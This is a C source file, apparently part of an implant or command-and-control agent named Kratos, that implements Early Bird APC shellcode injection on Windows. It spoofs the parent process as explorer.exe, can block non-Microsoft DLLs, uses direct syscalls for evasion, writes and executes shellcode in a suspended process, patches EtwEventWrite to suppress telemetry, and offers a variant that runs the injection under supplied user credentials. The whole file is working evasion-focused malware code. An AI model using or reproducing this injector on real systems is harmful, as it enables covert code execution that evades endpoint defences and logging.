#define _WIN32_WINNT 0x0601
#include "inject.h"
#include "utils.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif

#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

char g_spawnto_path[512] = INJECT_DEFAULT_SPAWNTO;
int  g_blockdlls         = 0;

static DWORD find_explorer_pid(void) {
    DWORD  pid   = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) do {
        if (_stricmp(pe.szExeFile, "explorer.exe") == 0 && !pid)
            pid = pe.th32ProcessID;
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    return pid;
}

int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     int capture_output,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    /* PPID spoof: open explorer with PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE.
     * PROCESS_DUP_HANDLE lets us copy pipe write-ends into explorer's handle table so
     * the child (whose inherited handles come from the spoofed parent) can write to them. */
    DWORD  spoof_pid = find_explorer_pid();
    HANDLE hParent   = NULL;
    if (spoof_pid) {
#ifdef EVASION_SYSCALLS
        NTSTATUS _st = kratos_NtOpenProcess(&hParent,
                           PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, spoof_pid);
        if (!NT_SUCCESS(_st)) hParent = NULL;
#else
        hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, spoof_pid);
#endif
    }

    /* Anonymous pipe for output capture.
     * If PPID spoof is active, duplicate the write-ends into the parent's handle space:
     * the child inherits handles from its "parent" (explorer), not from Kratos, so our
     * local handles would not be inherited. The duplicated copies live in explorer's table
     * and are inherited correctly. */
    HANDLE hPipeRead  = NULL;
    HANDLE hPipeWrite = NULL;
    HANDLE hNullIn    = NULL;
    HANDLE hDupWrite  = NULL;  /* write-end duplicated into hParent's handle space */
    HANDLE hDupNullIn = NULL;  /* stdin null duplicated into hParent's handle space */
    out->hPipeRead = NULL;
    if (capture_output) {
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        if (CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
            SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
            hNullIn = CreateFileA("nul", GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  &sa, OPEN_EXISTING, 0, NULL);
            if (hParent) {
                if (!DuplicateHandle(GetCurrentProcess(), hPipeWrite,
                                     hParent, &hDupWrite,
                                     0, TRUE, DUPLICATE_SAME_ACCESS))
                    hDupWrite = NULL;
                if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) {
                    if (!DuplicateHandle(GetCurrentProcess(), hNullIn,
                                         hParent, &hDupNullIn,
                                         0, TRUE, DUPLICATE_SAME_ACCESS))
                        hDupNullIn = NULL;
                }
            }
        } else {
            hPipeRead = NULL; hPipeWrite = NULL;
        }
    }

    /* Attribute list: PPID spoof + BlockDLLs. */
    int     attr_count = (hParent ? 1 : 0) + (g_blockdlls ? 1 : 0);
    BOOL    use_attr   = FALSE;
    LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
    DWORD64 mitigation_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    if (attr_count > 0) {
        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
        attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (attr && InitializeProcThreadAttributeList(attr, attr_count, 0, &attr_size)) {
            use_attr = TRUE;
            if (hParent)
                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                          &hParent, sizeof(hParent), NULL, NULL);
            if (g_blockdlls)
                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                                          &mitigation_policy, sizeof(mitigation_policy), NULL, NULL);
        } else {
            if (attr) { HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
        }
    }

    /* Build lpCommandLine */
    wchar_t wcmdline[2048] = {0};
    if (cmdline_override)
        MultiByteToWideChar(CP_UTF8, 0, cmdline_override, -1, wcmdline, 2048);
    else
        wcsncpy(wcmdline, whost_full, 2047);

    /* Choose which handle values go into STARTF_USESTDHANDLES.
     * If we have duplicates in parent's space, use those (child inherits from parent).
     * Fallback to our local handles if duplication failed (no PPID spoof or DupHandle failed). */
    HANDLE hStdOut = hDupWrite  ? hDupWrite  : hPipeWrite;
    HANDLE hStdIn  = hDupNullIn ? hDupNullIn : ((hNullIn && hNullIn != INVALID_HANDLE_VALUE) ? hNullIn : NULL);

    STARTUPINFOEXW siex;
    ZeroMemory(&siex, sizeof(siex));
    siex.StartupInfo.cb          = use_attr ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
    siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    if (use_attr) siex.lpAttributeList = attr;
    if (hStdOut) {
        siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
        siex.StartupInfo.hStdOutput = hStdOut;
        siex.StartupInfo.hStdError  = hStdOut;
        siex.StartupInfo.hStdInput  = hStdIn;
    }

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (use_attr) cflags |= EXTENDED_STARTUPINFO_PRESENT;

    /* bInheritHandles=TRUE so the child inherits the handles from its "parent" handle table */
    BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL,
                             (hStdOut != NULL) ? TRUE : FALSE,
                             cflags, NULL, NULL, &siex.StartupInfo, &pi);
    if (use_attr) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }

    /* Close our local copies of the write-ends; child (via parent's table) already has them */
    if (hPipeWrite)  CloseHandle(hPipeWrite);
    if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
    /* Remove the duplicated copies from parent's handle table (child already inherited them) */
    if (hDupWrite && hParent)
        DuplicateHandle(hParent, hDupWrite, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
    if (hDupNullIn && hParent)
        DuplicateHandle(hParent, hDupNullIn, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
    if (hParent) CloseHandle(hParent);

    if (!ok) {
        if (hPipeRead) CloseHandle(hPipeRead);
        snprintf(errmsg, errmsg_len, "Error: CreateProcess(%s) failed (%lu)",
                 g_spawnto_path, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC - fires inside LdrInitializeThunk (alertable wait, before CFG active) */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Patch EtwEventWrite in the child's ntdll before resuming.
     * ntdll is mapped at the same base in all processes within the session (boot-time ASLR),
     * so GetProcAddress in our process gives the valid address in the child too. */
    {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
            if (pEtw) {
                static const BYTE etw_patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax,eax; ret */
                DWORD old_prot = 0;
                if (VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                     PAGE_EXECUTE_READWRITE, &old_prot)) {
                    WriteProcessMemory(pi.hProcess, (LPVOID)pEtw,
                                       etw_patch, sizeof(etw_patch), NULL);
                    VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                     old_prot, &old_prot);
                }
            }
        }
    }

    ResumeThread(pi.hThread);

    out->hProcess  = pi.hProcess;
    out->hThread   = pi.hThread;
    out->pid       = pi.dwProcessId;
    out->hPipeRead = hPipeRead;
    return 1;
}

#ifdef INCLUDE_CMD_SPAWNAS

int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                             const char *username, const char *domain, const char *password,
                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    wchar_t wuser[256]   = {0};
    wchar_t wdomain[256] = {0};
    wchar_t wpass[256]   = {0};
    MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
    MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);
    /* NULL domain = Windows auto-resolves (like runas /netonly without /domain).
     * "." = local machine only. Pass NULL when no domain specified so domain
     * accounts like j.walsh resolve correctly without needing the NetBIOS name. */
    int use_domain = (domain && domain[0] && strcmp(domain, ".") != 0);
    if (use_domain)
        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdomain, 256);

    wchar_t wcmdline[2048] = {0};
    wcsncpy(wcmdline, whost_full, 2047);

    /* Add user SID to window station + desktop DACLs before spawning */
    char desktop_name[320] = {0};
    grant_winsta_desktop_access(username,
                                use_domain ? domain : NULL,
                                desktop_name, sizeof(desktop_name));

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (desktop_name[0]) {
        wchar_t wdesktop[320] = {0};
        MultiByteToWideChar(CP_UTF8, 0, desktop_name, -1, wdesktop, 320);
        si.lpDesktop = wdesktop;
    }

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessWithLogonW(
        wuser, use_domain ? wdomain : NULL, wpass,
        LOGON_WITH_PROFILE,
        whost_full, wcmdline,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    if (!ok) {
        snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
                 use_domain ? domain : "*", username, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    ResumeThread(pi.hThread);

    out->hProcess = pi.hProcess;
    out->hThread  = pi.hThread;
    out->pid      = pi.dwProcessId;
    return 1;
}

#endif /* INCLUDE_CMD_SPAWNAS */

#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START || INCLUDE_CMD_SPAWNAS */
